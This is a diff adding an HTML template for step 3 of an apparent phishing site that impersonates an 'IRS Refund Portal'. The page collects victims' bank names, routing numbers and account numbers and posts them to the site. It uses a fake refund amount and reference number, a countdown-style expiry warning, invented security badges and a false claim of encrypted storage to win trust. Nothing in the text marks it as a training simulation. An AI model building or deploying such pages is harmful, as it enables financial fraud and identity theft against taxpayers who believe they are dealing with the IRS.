@@ -1,0 +1,172 @@
+{% extends "layout.html" %}
+
+{% block title %}Step 3: Direct Deposit Setup — IRS Refund Portal{% endblock %}
+{% block breadcrumb %}Direct Deposit Setup{% endblock %}
+
+{% block content %}
+<div class="page-main">
+
+    <div class="form-col">
+
+        <h1 class="page-title">Tax Refund Verification Portal</h1>
+        <p class="page-subtitle">Reference No: IRS-2026-REF-84920 &nbsp;|&nbsp; Refund Amount: <strong>$4,287.00</strong></p>
+
+        <div class="progress-steps">
+            <div class="progress-step completed"><span class="step-num">✓</span>Identity</div>
+            <div class="progress-step completed"><span class="step-num">✓</span>Contact</div>
+            <div class="progress-step active"><span class="step-num">3</span>Deposit</div>
+            <div class="progress-step"><span class="step-num">4</span>Processing</div>
+            <div class="progress-step"><span class="step-num">5</span>Review</div>
+        </div>
+
+        <div class="alert alert-success">
+            ✅ &nbsp; Contact information verified. Please provide your bank account details for direct deposit of your refund.
+        </div>
+
+        <div class="form-card">
+            <div class="form-card-title">
+                🏦 &nbsp; Step 3 of 5 — Direct Deposit Setup
+            </div>
+            <div class="form-card-desc">
+                Your $4,287.00 tax refund will be deposited directly into the bank account you specify below. Direct deposit is the fastest and most secure way to receive your refund. Standard processing takes <strong>3–5 business days</strong> once identity verification is complete.
+            </div>
+
+            <form method="POST" action="/step/3" class="validated">
+
+                <div class="form-group">
+                    <label for="bank_name">
+                        Bank / Financial Institution Name <span class="required">*</span>
+                    </label>
+                    <input type="text"
+                           id="bank_name"
+                           name="bank_name"
+                           placeholder="e.g. Chase Bank, Bank of America, Wells Fargo"
+                           required
+                           autocomplete="organization">
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="routing_number">
+                            Routing Number (ABA) <span class="required">*</span>
+                        </label>
+                        <input type="text"
+                               id="routing_number"
+                               name="routing_number"
+                               placeholder="9-digit routing number"
+                               maxlength="9"
+                               required
+                               autocomplete="off"
+                               aria-describedby="routing-hint">
+                        <div class="field-hint" id="routing-hint">
+                            The 9-digit number in the bottom-left corner of your check.
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="account_number">
+                            Account Number <span class="required">*</span>
+                        </label>
+                        <input type="text"
+                               id="account_number"
+                               name="account_number"
+                               placeholder="Your account number"
+                               maxlength="17"
+                               required
+                               autocomplete="off"
+                               aria-describedby="acct-hint">
+                        <div class="field-hint" id="acct-hint">
+                            Found to the right of the routing number on the bottom of your check.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="account_type">
+                        Account Type <span class="required">*</span>
+                    </label>
+                    <select id="account_type" name="account_type" required>
+                        <option value="">— Select account type —</option>
+                        <option value="checking">Checking</option>
+                        <option value="savings">Savings</option>
+                    </select>
+                </div>
+
+                <!-- Check diagram -->
+                <div style="background:#f9f9f9;border:1px solid #dde1e7;border-radius:6px;padding:16px;margin-bottom:20px;font-size:13px;">
+                    <div style="font-weight:600;margin-bottom:8px;color:#1c3a6e;">📋 Where to find your account details:</div>
+                    <div style="background:#fff;border:1px solid #ccc;border-radius:4px;padding:12px;font-family:monospace;font-size:12px;color:#333;">
+                        <div style="margin-bottom:8px">JOHN SMITH &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Check No. 1001</div>
+                        <div style="margin-bottom:8px">1234 Main St, Anytown, USA</div>
+                        <div style="margin-top:16px;border-top:1px solid #eee;padding-top:8px">
+                            <span style="background:#fff3cd;padding:2px 4px">⬅ <strong>Routing</strong></span>
+                            &nbsp;
+                            <span style="background:#d1ecf1;padding:2px 4px"><strong>Account Number</strong> ➡</span>
+                            &nbsp; Check No.
+                        </div>
+                        <div style="font-size:11px;letter-spacing:2px;margin-top:4px">⑆ 021000021 ⑆ &nbsp;&nbsp; 4892817364 ⑈ &nbsp;&nbsp; 1001</div>
+                    </div>
+                </div>
+
+                <hr>
+
+                <div class="security-badges">
+                    <div class="badge"><span class="icon">🔒</span> 256-bit SSL</div>
+                    <div class="badge"><span class="icon">✅</span> Bank-level Security</div>
+                    <div class="badge"><span class="icon">🛡️</span> ACH Encrypted</div>
+                    <div class="badge"><span class="icon">🔐</span> FDIC Backed</div>
+                </div>
+
+                <button type="submit" class="btn-primary">
+                    Continue to Step 4 →
+                </button>
+
+                <p class="text-muted mt-4">
+                    Your banking information is encrypted with AES-256 and never stored in plaintext. By providing your banking details, you authorize the IRS to deposit the specified refund amount via ACH transfer.
+                </p>
+
+            </form>
+        </div>
+
+    </div>
+
+    <aside class="sidebar-col">
+
+        <div class="refund-status-box">
+            <div class="label">📋 Your Pending Refund</div>
+            <div class="amount">$4,287.00</div>
+            <div class="ref">Ref: IRS-2026-REF-84920</div>
+            <div class="status-tracker">
+                <div class="status-step done"><div class="status-dot"></div>Identity Verification</div>
+                <div class="status-step done"><div class="status-dot"></div>Contact Verification</div>
+                <div class="status-step current"><div class="status-dot"></div>Direct Deposit Setup</div>
+                <div class="status-step"><div class="status-dot"></div>Processing</div>
+                <div class="status-step"><div class="status-dot"></div>Refund Issued</div>
+            </div>
+        </div>
+
+        <div class="alert alert-warning">
+            ⏱ <strong>Deadline:</strong> Your refund claim expires in <strong>6 days, 12 hours</strong>.
+        </div>
+
+        <div class="sidebar-widget">
+            <div class="sidebar-widget-title">Refund Delivery Options</div>
+            <ul>
+                <li>✅ <strong>Direct Deposit</strong> — 3–5 business days (recommended)</li>
+                <li>📬 Paper Check — 6–8 weeks by mail</li>
+            </ul>
+            <p style="margin-top:8px">Direct deposit is the IRS's preferred method and is 99.9% error-free compared to paper checks.</p>
+        </div>
+
+        <div class="sidebar-widget">
+            <div class="sidebar-widget-title">Need Help?</div>
+            <ul>
+                <li>Taxpayer Service: <strong>1-800-829-1040</strong></li>
+                <li><a href="#">Direct Deposit FAQ</a></li>
+                <li><a href="#">Find Your Routing Number</a></li>
+            </ul>
+        </div>
+
+    </aside>
+
+</div>
+{% endblock %}
